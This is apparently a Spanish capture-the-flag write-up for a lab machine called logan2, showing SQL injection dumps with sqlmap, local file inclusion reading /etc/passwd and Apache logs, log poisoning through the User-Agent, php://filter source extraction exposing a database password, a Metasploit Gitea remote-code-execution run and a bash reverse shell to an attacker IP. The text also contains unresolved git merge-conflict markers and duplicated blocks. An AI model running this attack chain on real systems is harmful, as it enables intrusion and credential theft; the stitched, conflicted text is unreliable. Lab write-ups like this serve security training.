<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ wfuzz -c -t 200 --hc=404 --hl=0 -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt &#39;http://newsitelogan.logan.hmv/photos-website-logan.php?photo=FUZZ&#39;                               W        0 Ch        &#34;/etc/h
</span></span><span class="line"><span class="cl">********************************************************
</span></span><span class="line"><span class="cl">* Wfuzz 3.1.0 - The Web Fuzzer                         *
</span></span><span class="line"><span class="cl">********************************************************
</span></span><span class="line"><span class="cl">pd/logs/error_log&#34;    
</span></span><span class="line"><span class="cl">Target: http://newsitelogan.logan.hmv/photos-website-logan.php?photo=FUZZ
</span></span><span class="line"><span class="cl">Total requests: 922
</span></span><span class="line"><span class="cl">pd/logs/error.log&#34;    
</span></span><span class="line"><span class="cl">=====================================================================
</span></span><span class="line"><span class="cl">ID           Response   Lines    Word       Chars       Payload                                                                     
</span></span><span class="line"><span class="cl">=====================================================================
</span></span><span class="line"><span class="cl">                                
</span></span><span class="line"><span class="cl">000000649:   200        4 L      79 W       724 Ch      &#34;../../../../../../../var/log/apache2/error.log&#34;                            
</span></span><span class="line"><span class="cl">000000645:   200        1508 L   18141 W    232056 Ch   &#34;../../../../../../../var/log/apache2/access.log&#34;                            
</span></span></code></pre></div><p>Con curl leo el archivo <code>access.log</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ curl -s &#39;http://newsitelogan.logan.hmv/photos-website-logan.php?photo=../../../../../../../var/log/apache2/access.log&#39;
</span></span><span class="line"><span class="cl">Logs are cleaned every minut
</span></span><span class="line"><span class="cl">192.168.1.17 - - [12/Oct/2023:06:55:02 -0500] &#34;GET /photos-website-logan.php?photo=../../../../../../../var/log/apache2/access.log HTTP/1.1&#34; 200 233 &#34;-&#34; &#34;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0&#34;
</span></span><span class="line"><span class="cl">192.168.1.17 - - [12/Oct/2023:06:55:16 -0500] &#34;GET / HTTP/1.1&#34; 200 10751 &#34;-&#34; &#34;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0&#34;
</span></span><span class="line"><span class="cl">192.168.1.17 - - [12/Oct/2023:06:55:17 -0500] &#34;GET /photos-website-logan.php?photo=../../../../../../../var/log/apache2/access.log HTTP/1.1&#34; 200 492 &#34;-&#34; &#34;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0&#34;
=======
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ sqlmap -r agent --level 5 --risk 3 --dbs --batch
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>available databases [2]:
</span></span><span style="display:flex;"><span>[*] information_schema
</span></span><span style="display:flex;"><span>[*] logan
</span></span></code></pre></div><p>Buscando las tablas de <strong>logan</strong>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ sqlmap -r agent --level 5 --risk 3 -D logan --tables
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Database: logan
</span></span><span style="display:flex;"><span>[3 tables]
</span></span><span style="display:flex;"><span>+----------+
</span></span><span style="display:flex;"><span>| browser  |
</span></span><span style="display:flex;"><span>| comments |
</span></span><span style="display:flex;"><span>| users    |
</span></span><span style="display:flex;"><span>+----------+
</span></span></code></pre></div><p>Dumpeo de la tabla <strong>users</strong> y encuentro el subdominio <code>newsitelogan.logan.hmv</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ sqlmap -r agent --level 5 --risk 3 -T users --dump
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Database: logan
</span></span><span style="display:flex;"><span>Table: users
</span></span><span style="display:flex;"><span>[1 entry]
</span></span><span style="display:flex;"><span>+------------------------------+--------+
</span></span><span style="display:flex;"><span>| email                        | user   |
</span></span><span style="display:flex;"><span>+------------------------------+--------+
</span></span><span style="display:flex;"><span>| logan@newsitelogan.logan.hmv | logan  |
</span></span><span style="display:flex;"><span>+------------------------------+--------+
</span></span></code></pre></div><p>Añado el nuevo subdominio a mi archivo hosts y seguidamente lo visito con el navegador.</p>
<p><img src="/../machines/hmv/logan2/subdomain.webp" alt="subdomain"></p>
<p>Fuerza bruta de extensiones.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ gobuster dir -u http://newsitelogan.logan.hmv/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php,txt
</span></span><span style="display:flex;"><span>===============================================================
</span></span><span style="display:flex;"><span>Gobuster v3.6
</span></span><span style="display:flex;"><span>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
</span></span><span style="display:flex;"><span>===============================================================
</span></span><span style="display:flex;"><span>[+] Url:                     http://newsitelogan.logan.hmv/
</span></span><span style="display:flex;"><span>[+] Method:                  GET
</span></span><span style="display:flex;"><span>[+] Threads:                 10
</span></span><span style="display:flex;"><span>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
</span></span><span style="display:flex;"><span>[+] Negative Status codes:   404
</span></span><span style="display:flex;"><span>[+] User Agent:              gobuster/3.6
</span></span><span style="display:flex;"><span>[+] Extensions:              php
</span></span><span style="display:flex;"><span>[+] Timeout:                 10s
</span></span><span style="display:flex;"><span>===============================================================
</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
</span></span><span style="display:flex;"><span>===============================================================
</span></span><span style="display:flex;"><span>/comments.php         (Status: 500) [Size: 0]
</span></span><span style="display:flex;"><span>/config.php           (Status: 200) [Size: 0]
</span></span><span style="display:flex;"><span>/images               (Status: 301) [Size: 333] [--&gt; http://newsitelogan.logan.hmv/images/]
</span></span><span style="display:flex;"><span>/index.php            (Status: 200) [Size: 51045]
</span></span><span style="display:flex;"><span>/javascript           (Status: 301) [Size: 337] [--&gt; http://newsitelogan.logan.hmv/javascript/]
</span></span><span style="display:flex;"><span>/server-status        (Status: 403) [Size: 287]
</span></span></code></pre></div><p>En el código fuente veo en un comentario el archivo <code>photos-website-logan.php</code> que parece que es el encargado de cargar imágenes.</p>
<p><img src="/../machines/hmv/logan2/sourcecode.webp" alt="sourcecode"></p>
<p>Realizando enumeración básica encuentro un LFI.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ curl &#39;http://newsitelogan.logan.hmv/photos-website-logan.php?photo=../../../../../etc/passwd&#39;
</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span style="display:flex;"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>avahi-autoipd:x:101:108:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>logan:x:1000:1000:logan,,,:/home/logan:/bin/bash
</span></span><span style="display:flex;"><span>sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>mysql:x:103:112:MySQL Server,,,:/nonexistent:/bin/false
</span></span><span style="display:flex;"><span>git:x:104:113:Git Version Control,,,:/home/git:/bin/bash
</span></span><span style="display:flex;"><span>kevin:x:1001:1001:kevin,,,:/home/kevin:/bin/bash
</span></span></code></pre></div><p>Con wfuzz realizo fuerza bruta para encontrar archivos que pueda leer.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ wfuzz -c -t 200 --hc=404 --hl=0 -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt &#39;http://newsitelogan.logan.hmv/photos-website-logan.php?photo=FUZZ&#39;                               W        0 Ch        &#34;/etc/h
</span></span><span style="display:flex;"><span>********************************************************
</span></span><span style="display:flex;"><span>* Wfuzz 3.1.0 - The Web Fuzzer                         *
</span></span><span style="display:flex;"><span>********************************************************
</span></span><span style="display:flex;"><span>pd/logs/error_log&#34;    
</span></span><span style="display:flex;"><span>Target: http://newsitelogan.logan.hmv/photos-website-logan.php?photo=FUZZ
</span></span><span style="display:flex;"><span>Total requests: 922
</span></span><span style="display:flex;"><span>pd/logs/error.log&#34;    
</span></span><span style="display:flex;"><span>=====================================================================
</span></span><span style="display:flex;"><span>ID           Response   Lines    Word       Chars       Payload                                                                     
</span></span><span style="display:flex;"><span>=====================================================================
</span></span><span style="display:flex;"><span>                                
</span></span><span style="display:flex;"><span>000000649:   200        4 L      79 W       724 Ch      &#34;../../../../../../../var/log/apache2/error.log&#34;                            
</span></span><span style="display:flex;"><span>000000645:   200        1508 L   18141 W    232056 Ch   &#34;../../../../../../../var/log/apache2/access.log&#34;                            
</span></span></code></pre></div><p>Con curl leo el archivo <code>access.log</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ curl -s &#39;http://newsitelogan.logan.hmv/photos-website-logan.php?photo=../../../../../../../var/log/apache2/access.log&#39;
</span></span><span style="display:flex;"><span>Logs are cleaned every minut
</span></span><span style="display:flex;"><span>192.168.1.17 - - [12/Oct/2023:06:55:02 -0500] &#34;GET /photos-website-logan.php?photo=../../../../../../../var/log/apache2/access.log HTTP/1.1&#34; 200 233 &#34;-&#34; &#34;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0&#34;
</span></span><span style="display:flex;"><span>192.168.1.17 - - [12/Oct/2023:06:55:16 -0500] &#34;GET / HTTP/1.1&#34; 200 10751 &#34;-&#34; &#34;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0&#34;
</span></span><span style="display:flex;"><span>192.168.1.17 - - [12/Oct/2023:06:55:17 -0500] &#34;GET /photos-website-logan.php?photo=../../../../../../../var/log/apache2/access.log HTTP/1.1&#34; 200 492 &#34;-&#34; &#34;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0&#34;
>>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
</span></span></code></pre></div><p>Al tener acceso al archivo <code>access.log</code> realizo un <code>log-poisoning</code>, en  este caso uso el <code>user-agent</code> para poner el código de la función <strong>phpinfo</strong>, con esta función puedo ver como está configurado el servidor php porque he tenido problemas para mandarme una shell.</p>
<p><img src="/../machines/hmv/logan2/burpphpinfo.webp" alt="burpphpinfo"></p>
<p>Al mandar la petición con <strong>burpsuite</strong> puedo ver el <strong>phpinfo</strong> desde el <code>access.log</code>.</p>
<p><img src="/../machines/hmv/logan2/phpinfo.webp" alt="phpinfo"></p>
<p>Me doy cuenta de que existen algunas funciones deshabilitadas con lo cual no podré usar una shell para ganar acceso al sistema.</p>
<p><img src="/../machines/hmv/logan2/phpinfodisablef2.webp" alt="phpinfodisablef2"></p>
<p>Anteriormente al realizar fuerza bruta de extensiones encontré varios archivos <strong>php</strong> así que voy a tratar de incluir los archivos con la función <code>include()</code> y leerlos con los famosos filtros de php.</p>
<p><img src="/../machines/hmv/logan2/burpinclude.webp" alt="burpinclude"></p>
<p>Con curl mando la petición junto el filtro php y obtengo la cadena en base64.</p>
<<<<<<< HEAD
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ curl -s &#39;http://newsitelogan.logan.hmv/photos-website-logan.php?photo=../../../../../../../var/log/apache2/access.log&amp;c=php://filter/convert.base64-encode/resource=config.php&#39;
</span></span><span class="line"><span class="cl">192.168.1.17 - - [12/Oct/2023:09:00:24 -0500] &#34;GET /photos-website-logan.php?photo=../../../../../../../var/log/apache2/access.log HTTP/1.1&#34; 200 504 &#34;-&#34; &#34;Mozilla/5.0 PD9waHAKCQoJJHNlcnZlcm5hbWUgPSAibG9jYWxob3N0IjsKCSR1c2VybmFtZSA9ICJsb2dhbiI7CgkkcGFzc3dvcmQgPSAiU3VwZXJfbG9nYW4xMjM0IjsKCSRkYm5hbWUgPSAibG9nYW4iOwoKCS8vIENyZWF0ZSBjb25uZWN0aW9uCgkkY29ubiA9IG5ldyBteXNxbGkoJHNlcnZlcm5hbWUsICR1c2VybmFtZSwgJHBhc3N3b3JkLCAkZGJuYW1lKTsKCS8vIENoZWNrIGNvbm5lY3Rpb24KCWlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewoJICBkaWUoIkNvbm5lY3Rpb24gZmFpbGVkOiAiIC4gJGNvbm4tPmNvbm5lY3RfZXJyb3IpOwoJfQoKPz4K AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36&#34;
</span></span></code></pre></div><p>Decodifico la cadena y encuentro unas credenciales.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nv">$servername</span> <span class="o">=</span> <span class="s2">&#34;localhost&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$username</span> <span class="o">=</span> <span class="s2">&#34;logan&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$password</span> <span class="o">=</span> <span class="s2">&#34;S****_*********&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$dbname</span> <span class="o">=</span> <span class="s2">&#34;logan&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// Create connection
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nv">$conn</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mysqli</span><span class="p">(</span><span class="nv">$servername</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">,</span> <span class="nv">$dbname</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// Check connection
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">if</span> <span class="p">(</span><span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">connect_error</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	 <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Connection failed: &#34;</span> <span class="o">.</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">connect_error</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
=======
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ curl -s &#39;http://newsitelogan.logan.hmv/photos-website-logan.php?photo=../../../../../../../var/log/apache2/access.log&amp;c=php://filter/convert.base64-encode/resource=config.php&#39;
</span></span><span style="display:flex;"><span>192.168.1.17 - - [12/Oct/2023:09:00:24 -0500] &#34;GET /photos-website-logan.php?photo=../../../../../../../var/log/apache2/access.log HTTP/1.1&#34; 200 504 &#34;-&#34; &#34;Mozilla/5.0 PD9waHAKCQoJJHNlcnZlcm5hbWUgPSAibG9jYWxob3N0IjsKCSR1c2VybmFtZSA9ICJsb2dhbiI7CgkkcGFzc3dvcmQgPSAiU3VwZXJfbG9nYW4xMjM0IjsKCSRkYm5hbWUgPSAibG9nYW4iOwoKCS8vIENyZWF0ZSBjb25uZWN0aW9uCgkkY29ubiA9IG5ldyBteXNxbGkoJHNlcnZlcm5hbWUsICR1c2VybmFtZSwgJHBhc3N3b3JkLCAkZGJuYW1lKTsKCS8vIENoZWNrIGNvbm5lY3Rpb24KCWlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewoJICBkaWUoIkNvbm5lY3Rpb24gZmFpbGVkOiAiIC4gJGNvbm4tPmNvbm5lY3RfZXJyb3IpOwoJfQoKPz4K AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36&#34;
</span></span></code></pre></div><p>Decodifico la cadena y encuentro unas credenciales.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	$servername <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;localhost&#34;</span>;
</span></span><span style="display:flex;"><span>	$username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;logan&#34;</span>;
</span></span><span style="display:flex;"><span>	$password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;S****_*********&#34;</span>;
</span></span><span style="display:flex;"><span>	$dbname <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;logan&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Create connection
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	$conn <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">mysqli</span>($servername, $username, $password, $dbname);
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Check connection
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> ($conn<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">connect_error</span>) {
</span></span><span style="display:flex;"><span>	 <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Connection failed: &#34;</span> <span style="color:#f92672">.</span> $conn<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">connect_error</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
>>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
</span></span></span></code></pre></div><p>Ahora visito el puerto <strong>3000</strong> y encuentro un servicio <strong>Gitea</strong> en el cual se puede ver que usa la versión <code>1.12.5</code>.</p>
<p><img src="/../machines/hmv/logan2/gitea.webp" alt="gitea"></p>
<p>Inicio sesión con las credenciales encontradas.</p>
<p><img src="/../machines/hmv/logan2/giteadashboard.webp" alt="giteadashboard"></p>
<p>Explorando el directorio de <code>future_web</code> encuentro el archivo <code>app.py</code>.</p>
<p><img src="/../machines/hmv/logan2/apppy.webp" alt="apppy"></p>
<p>Con metasploit hago una búsqueda de gitea y encuentro un exploit <strong>RCE</strong> para <code>Gitea 1.12.5</code>.</p>
<<<<<<< HEAD
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">msf6 &gt; search gitea
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Matching Modules
</span></span><span class="line"><span class="cl">================
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   #  Name                                    Disclosure Date  Rank       Check  Description
</span></span><span class="line"><span class="cl">   -  ----                                    ---------------  ----       -----  -----------
</span></span><span class="line"><span class="cl">   1  exploit/multi/http/gitea_git_hooks_rce  2020-10-07       excellent  Yes    Gitea Git Hooks Remote Code Execution
</span></span></code></pre></div><p>Configuro el exploit y lo lanzo.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">msf6 exploit(multi/http/gitea_git_hooks_rce) &gt; run
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[*] Started reverse TCP handler on 192.168.1.17:4444 
</span></span><span class="line"><span class="cl">[*] Running automatic check (&#34;set AutoCheck false&#34; to disable)
</span></span><span class="line"><span class="cl">[+] The target appears to be vulnerable. Gitea version is 1.12.5
</span></span><span class="line"><span class="cl">[*] Executing Linux Dropper for linux/x64/meterpreter/reverse_tcp
</span></span><span class="line"><span class="cl">[*] Authenticate with &#34;logan/Super_logan1234&#34;
</span></span><span class="line"><span class="cl">[+] Logged in
</span></span><span class="line"><span class="cl">[*] Create repository &#34;Alphazap_Y-Solowarm&#34;
</span></span><span class="line"><span class="cl">[+] Repository created
</span></span><span class="line"><span class="cl">[*] Setup post-receive hook with command
</span></span><span class="line"><span class="cl">[+] Git hook setup
</span></span><span class="line"><span class="cl">[*] Create a dummy file on the repo to trigger the payload
</span></span><span class="line"><span class="cl">[+] File created, shell incoming...
</span></span><span class="line"><span class="cl">[*] Sending stage (3045380 bytes) to 192.168.1.140
</span></span><span class="line"><span class="cl">[*] Command Stager progress - 100.00% done (833/833 bytes)
</span></span><span class="line"><span class="cl">[*] Meterpreter session 1 opened (192.168.1.17:4444 -&gt; 192.168.1.140:57578) at 2023-10-12 16:56:32 +0200
</span></span><span class="line"><span class="cl">[*] Cleaning up
</span></span><span class="line"><span class="cl">[*] Repository Alphazap_Y-Solowarm deleted.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">meterpreter &gt; 
</span></span></code></pre></div><p>Como la shell del meterpreter es bastante  justa me lanzo una nueva shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">meterpreter &gt; bash -c &#34;bash -i &gt;&amp; /dev/tcp/192.168.1.17/443 0&gt;&amp;1&#34;
</span></span></code></pre></div><p>Una vez termino el tratamiento de la tty enumero permisos de sudo.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">git@logan2:$ sudo -l
</span></span><span class="line"><span class="cl">Matching Defaults entries for git on logan2:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User git may run the following commands on logan2:
</span></span><span class="line"><span class="cl">    (ALL) NOPASSWD: /usr/bin/python3 /opt/app.py
</span></span></code></pre></div><p>Al lanzar <code>app.py</code> crea un servidor web en python en el puerto <strong>8000</strong> y genera un pin.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">git@logan2:~$ sudo /usr/bin/python3 /opt/app.py
</span></span><span class="line"><span class="cl"> * Serving Flask app &#39;app&#39;
</span></span><span class="line"><span class="cl"> * Debug mode: on
</span></span><span class="line"><span class="cl">WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
</span></span><span class="line"><span class="cl"> * Running on all addresses (0.0.0.0)
</span></span><span class="line"><span class="cl"> * Running on http://127.0.0.1:8000
</span></span><span class="line"><span class="cl"> * Running on http://192.168.1.140:8000
</span></span><span class="line"><span class="cl">Press CTRL+C to quit
</span></span><span class="line"><span class="cl"> * Restarting with stat
</span></span><span class="line"><span class="cl"> * Debugger is active!
</span></span><span class="line"><span class="cl"> * Debugger PIN: 768-889-478
</span></span></code></pre></div><p>Visualizo la web desde el navegador.</p>
<p><img src="/../machines/hmv/logan2/apppy8000.webp" alt="apppy8000"></p>
<p>Fuerza bruta de directorios.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ gobuster dir -u http://192.168.1.140:8000 -w /usr/share/seclists/Discovery/Web-Content/big.txt
</span></span><span class="line"><span class="cl">===============================================================
</span></span><span class="line"><span class="cl">Gobuster v3.6
</span></span><span class="line"><span class="cl">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
</span></span><span class="line"><span class="cl">===============================================================
</span></span><span class="line"><span class="cl">[+] Url:                     http://192.168.1.140:8000
</span></span><span class="line"><span class="cl">[+] Method:                  GET
</span></span><span class="line"><span class="cl">[+] Threads:                 10
</span></span><span class="line"><span class="cl">[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
</span></span><span class="line"><span class="cl">[+] Negative Status codes:   404
</span></span><span class="line"><span class="cl">[+] User Agent:              gobuster/3.6
</span></span><span class="line"><span class="cl">[+] Timeout:                 10s
</span></span><span class="line"><span class="cl">===============================================================
</span></span><span class="line"><span class="cl">Starting gobuster in directory enumeration mode
</span></span><span class="line"><span class="cl">===============================================================
</span></span><span class="line"><span class="cl">/console              (Status: 200) [Size: 1563]
</span></span><span class="line"><span class="cl">/test                 (Status: 200) [Size: 160]
=======
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>msf6 &gt; search gitea
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Matching Modules
</span></span><span style="display:flex;"><span>================
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   #  Name                                    Disclosure Date  Rank       Check  Description
</span></span><span style="display:flex;"><span>   -  ----                                    ---------------  ----       -----  -----------
</span></span><span style="display:flex;"><span>   1  exploit/multi/http/gitea_git_hooks_rce  2020-10-07       excellent  Yes    Gitea Git Hooks Remote Code Execution
</span></span></code></pre></div><p>Configuro el exploit y lo lanzo.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>msf6 exploit(multi/http/gitea_git_hooks_rce) &gt; run
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[*] Started reverse TCP handler on 192.168.1.17:4444 
</span></span><span style="display:flex;"><span>[*] Running automatic check (&#34;set AutoCheck false&#34; to disable)
</span></span><span style="display:flex;"><span>[+] The target appears to be vulnerable. Gitea version is 1.12.5
</span></span><span style="display:flex;"><span>[*] Executing Linux Dropper for linux/x64/meterpreter/reverse_tcp
</span></span><span style="display:flex;"><span>[*] Authenticate with &#34;logan/Super_logan1234&#34;
</span></span><span style="display:flex;"><span>[+] Logged in
</span></span><span style="display:flex;"><span>[*] Create repository &#34;Alphazap_Y-Solowarm&#34;
</span></span><span style="display:flex;"><span>[+] Repository created
</span></span><span style="display:flex;"><span>[*] Setup post-receive hook with command
</span></span><span style="display:flex;"><span>[+] Git hook setup
</span></span><span style="display:flex;"><span>[*] Create a dummy file on the repo to trigger the payload
</span></span><span style="display:flex;"><span>[+] File created, shell incoming...
</span></span><span style="display:flex;"><span>[*] Sending stage (3045380 bytes) to 192.168.1.140
</span></span><span style="display:flex;"><span>[*] Command Stager progress - 100.00% done (833/833 bytes)
</span></span><span style="display:flex;"><span>[*] Meterpreter session 1 opened (192.168.1.17:4444 -&gt; 192.168.1.140:57578) at 2023-10-12 16:56:32 +0200
</span></span><span style="display:flex;"><span>[*] Cleaning up
</span></span><span style="display:flex;"><span>[*] Repository Alphazap_Y-Solowarm deleted.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>meterpreter &gt; 
</span></span></code></pre></div><p>Como la shell del meterpreter es bastante  justa me lanzo una nueva shell.</p>
